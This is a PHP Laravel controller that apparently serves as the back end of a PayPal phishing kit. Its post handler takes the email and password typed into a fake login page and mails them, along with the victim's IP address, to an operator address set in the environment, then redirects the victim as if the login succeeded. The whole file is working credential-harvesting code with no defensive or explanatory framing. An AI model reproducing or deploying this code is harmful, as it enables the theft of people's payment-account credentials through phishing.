<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Mail;

class SignInController extends Controller
{
    public function index()
    {
      return view('login');
    }

    public function post(Request $request)
    {
        Mail::send('emails.paypal',[
          'email' => $request->email,
          'password' => $request->password
        ],function($mail){
          $mail->subject("[SETOR][PP][" . $_SERVER['REMOTE_ADDR'] . "]");
          $mail->to(env("RESULT_EMAIl"));
          $mail->from("result@rizaltamvan.com", "RESULT GANTENG");
        });
        return Response::json(['data' => array('message' => 'success', 'redirecturl' => '/')]);
    }
}
